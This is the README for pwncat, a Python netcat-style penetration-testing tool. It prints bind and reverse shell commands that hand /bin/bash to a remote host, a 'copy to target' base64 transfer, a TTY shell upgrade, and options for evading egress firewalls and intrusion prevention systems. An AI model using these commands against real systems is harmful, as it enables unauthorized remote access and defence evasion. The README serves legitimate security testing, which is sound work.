# pwncat

**[Install](#tada-install)** |
**[TL;DR](#coffee-tldr)** |
**[Features](#star-features)** |
**[Documentation](#closed_book-documentation)** |
**[Usage](#computer-usage)** |
**[Examples](#bulb-examples)** |
**[cytopia sec tools](#lock-cytopia-sec-tools)** |
**[Contributing](#octocat-contributing)** |
**[Disclaimer](#exclamation-disclaimer)** |
**[License](#page_facing_up-license)**

[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)
[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)

[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)
[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)
[![Build Status](https://github.com/cytopia/pwncat/workflows/testing/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=testing)


> &nbsp;
> #### Netcat on steroids with Firewall and IPS evasion, bind and reverse shell, local and remote port-forward.
> &nbsp;


### Motivation

Ever accidentally hit <kbd>Ctrl</kbd>+<kbd>c</kbd> on your reverse shell and it was gone for good?
Ever waited forever for your client to connect back to you, because the Firewall didn't let it out?
Ever had a connection loss because an IPS closed suspicious ports?
Ever were in need of port-forwarding, but you didn't have SSH access?<br/>
> **This one got you covered.**

Apart from that the current features of `nc`, `ncat` or `socat` just didn't feed my needs and I also wanted to have a single
tool that works on older and newer machines (hence Python 2+3 compat). Most importantly I wanted to have it in a language that I can understand and provide my own features with.
(Wait for it, binary releases for Linux, MacOS and Windows will come shortly).

The options `-L`, and `-R` are still under development. See [Roadmap](https://github.com/cytopia/pwncat/issues/2) and [Changelog](CHANGELOG.md) for details.


## :tada: Install
```bash
pip install pwncat
```


## :coffee: TL;DR

#### Copy to target
```bash
# Copy base64 data to clipboard from where you have internet access
curl https://raw.githubusercontent.com/cytopia/pwncat/master/bin/pwncat | base64

# Paste it on the target machine
echo "<BASE64 STRING>" | base64 -d > pwncat
chmod +x pwncat
```
#### Summon shells
```bash
# bind shell
pwncat -l -e '/bin/bash' 8080
```
```bash
# reverse shell
pwncat -e '/bin/bash' example.com 4444
```
#### Port-forwarding without SSH
```bash
# Make local port available to public interface locally
pwncat -L 127.0.0.1:3306 192.168.0.1 3306
```
```bash
# Remote port-forwarding to evade firewalls
pwncat -R 127.0.0.1:3306 example.com 4444
```


## :star: Features

`pwncat` has many features, below is only a list of outstanding characteristics.

| Feature        | Description |
|----------------|-------------|
| Bind shell     | Create bind shells |
| Reverse shell  | Create reverse shells |
| Proxy          | Local and remote port forwards without SSH |
| Ctrl+c protect | Reverse shell can reconnect if you accidentally hit Ctrl+c |
| Detect Egress  | Scan and report open egress ports on the target |
| Evade FW       | Evade egress firewalls by round-robin outgoing ports |
| Evade IPS      | Evade Intrusion Prevention Systems by being able to round-robin outgoing ports on connection interrupts |
| UDP rev shell  | Try this with the traditional `netcat` |
| TCP / UDP      | Full TCP and UDP support |
| Python 2+3     | Works with Python 2 and Python 3 |
| Cross OS       | Should work on Linux, MacOS and Windows as long as Python is available |
| Compatability  | Use the traditional `netcat` as a client or server together with `pwncat` |


## :dizzy: Upgrade your shell

When connected to a remote or bind shell you'll notice that no interactive commands will work and
accidentally hitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your connection.
To fix this, you'll need to attach it to a TTY. Here's how:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
<kbd>Ctrl</kbd>+<kbd>z</kbd>
```bash
stty size
stty echo -raw
fg
reset
export SHELL=bash
export TERM=xterm
stty rows <num> columns <num>   # values found above by 'stty size'
```


## :closed_book: Documentation

Documentation will evolve over time. Currently only API documentation is available here:
https://cytopia.github.io/pwncat/pwncat.api.html


## :computer: Usage
```
usage: pwncat [-Cnuv] [-e cmd] hostname port
       pwncat [-Cnuv] [-e cmd] -l [hostname] port
       pwncat [-Cnuv] -z hostname port
       pwncat [-Cnuv] -L addr:port [hostname] port
       pwncat [-Cnuv] -R addr:port hostname port
       pwncat -V, --version
       pwncat -h, --help


Enhanced and comptaible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion prevention systems.

positional arguments:
  hostname              Address to listen, forward or connect to
  port                  Port to listen, forward or connect to

mode arguments:
  -l, --listen          [Listen mode]:
                        Start server and listen for incoming connections.

  -z, --zero            [Zero-I/0 mode]:
                        Connect to a remote endpoint and report status only.

  -L addr:port, --local addr:port
                        [Local forward mode]:
                        Specify local <addr>:<port> to which traffic should be
                        forwarded to. pwncat will listen locally
                        (specified by hostname and port) and forward all
                        traffic to the specified value for -L/--local.

  -R addr:port, --remote addr:port
                        [Remote forward mode]:
                        Specify local <addr>:<port> from which traffic should be
                        forwarded from. pwncat will connect remotely
                        (specified by hostname and port) and for ward all
                        traffic from the specified value for -R/--remote.

optional arguments:
  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.
  -C, --crlf            Send CRLF line-endings in connect mode (default: LF)
  -n, --nodns           Do not resolve DNS.
  -u, --udp             UDP mode
  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv
                        or -vvvv for more verbosity. The server performance will
                        decrease drastically if you use more than three -v.

advanced arguments:
  --reinit x            Listen mode (TCP only):
                        If the server is unable to bind or accept clients, it
                        will re-initialize itself x many times before giving up.
                        Use 0 to re-initialize endlessly. (default: don't).

                        Connect mode (TCP only):
                        If the client is unable to connect to a remote endpoint,
                        it will try again x many times before giving up.
                        Use 0 to retry endlessly. (default: don't)

                        Zero-I/O mode (TCP only):
                        Same as connect mode.

  --reconn x            Listen mode (TCP only):
                        If the client has hung up, the server will re-accept a
                        new client x many times before quitting. Use 0 to accept
                        endlessly. (default: quit after a client has hung up)

                        Connect mode (TCP only):
                        If the remote server is gone, the client will re-connect
                        to it x many times before giving up. Use 0 to reconnect
                        endlessy. (default: don't)
                        This might be handy for reverse shells ;-)

  --reinit-robin port   Connect mode (TCP only):
                        If the client does multiple initial connections to a
                        remote endpoint (via --reinit), this option instructs it
                        to also "round-robin" different ports to connect to. It
                        will stop iterating after first successfull connection
                        and stick with it or quit if --reinit limit is reached.
                        Use comma separated string: 80,81,82 or a range 80-100.
                        Set --reinit to at least the number of ports to probe +1
                        Set --reinit-wait to 0
                        This helps to evade EGRESS firewalls for reverse shells
                        Use with -z/--zero to probe outbound allowed ports.
                        Ensure to have enough listeners at the remote endpoint.

  --reconn-robin port   Connect mode (TCP only):
                        If the remote endpoint is gone after initial successful
                        connection, and the the client is set to reconnect with
                        (--reconn), it will connect back by "round-robin" to
                        different ports. It will stop after --reconn limit has
                        reached.
                        Set --reconn to at least the number of ports to probe +1
                        Set --reconn-wait to 0
                        This help your reverse shell to evade intrusion
                        prevention systems that will cut your connection and
                        block the outbound port.

  --reinit-wait s       Wait x seconds between re-inits. (default: 1)

  --reconn-wait s       Wait x seconds between re-connects. (default: 1)

  --udp-ping-intvl s    Connect mode (UDP only):
                        As UDP is stateless, a client must first connect to a
                        server before the server can communicate with it.
                        If you listen on UDP and wait for a reverse UDP client
                        or reverse UDP shell, you can only talk to it after it
                        has sent you some initial data, as UDP does not have a
                        "connect" state like TCP.
                        This option instructs the UDP client to send a single
                        newline every s seconds. By not only doing it once,
                        but in intervals, you can also maintain a connection
                        if you restart your listening server.

misc arguments:
  -h, --help            Show this help message and exit
  -V, --version         Show version information and exit
```


## :bulb: Examples

Find below some more detailed and advanced examples.


### Unbreakable UDP reverse shell
Why unbreakable? Because it will keep coming to you, also if you kill your listening server.
```bash
# The client
# --exec            # Provide this executable
# --nodns           # Keep the noise down and don't resolve hostnames
# --udp             # Use UDP mode
# --udp-ping-intvl  # Ping the server every 10 seconds

pwncat --exec /bin/bash --nodns --udp --udp-ping-intvl 10 10.0.0.1 4444
```
If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on
```bash
# The server
# -u   # Use UDP mode
# -l   # Listen for incoming connections
pwncat -u -l -vvvvv
```
You will see (among all the gibberish) a TRACE message:
```
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
```
As soon as you saw this on the listener, you can issue commands to the client.
All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
your server and start it again in silent mode:
```bash
# The server
pwncat -u -l -vvvvv
```
Now wait a maximum of 10 seconds and you can issue commands.
Having no info messages at all, are also troublesome. You might also want to know what is going
on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
the notifications to a logfile:
```bash
# The server
# 2> comm.txt   # This redirects the messages to a logfile instead
pwncat -u -l -vvv 2> comm.txt
```
Now all you'll see in your server window are the actual command inputs and outputs.
If you want to see what's going on behind the scene, open a second terminal window and tail
the `comm.txt` file:
```
# View communication info
tail -fn50 comm.txt

[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
```


## :lock: [cytopia](https://github.com/cytopia) sec tools

Below is a list of sec tools and docs I am maintaining.

| Name                 | Category             | Language   | Description |
|----------------------|----------------------|------------|-------------|
| **[offsec]**         | Documentation        | Markdown   | Offsec checklist, tools and examples |
| **[header-fuzz]**    | Enumeration          | Bash       | Fuzz HTTP headers |
| **[smtp-user-enum]** | Enumeration          | Python 2+3 | SMTP users enumerator |
| **[urlbuster]**      | Enumeration          | Python 2+3 | Mutable web directory fuzzer |
| **[pwncat]**         | Pivoting             | Python 2+3 | Cross-platform netcat on steroids |
| **[badchars]**       | Reverse Engineering  | Python 2+3 | Badchar generator |
| **[fuzza]**          | Reverse Engineering  | Python 2+3 | TCP fuzzing tool |

[offsec]: https://github.com/cytopia/offsec
[header-fuzz]: https://github.com/cytopia/header-fuzz
[smtp-user-enum]: https://github.com/cytopia/smtp-user-enum
[urlbuster]: https://github.com/cytopia/urlbuster
[pwncat]: https://github.com/cytopia/pwncat
[badchars]: https://github.com/cytopia/badchars
[fuzza]: https://github.com/cytopia/fuzza


## :octocat: Contributing

See **[Contributing guidelines](CONTRIBUTING.md)** to help to improve this project.


## :exclamation: Disclaimer

This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.


## :page_facing_up: License

**[MIT License](LICENSE.txt)**

Copyright (c) 2020 **[cytopia](https://github.com/cytopia)**
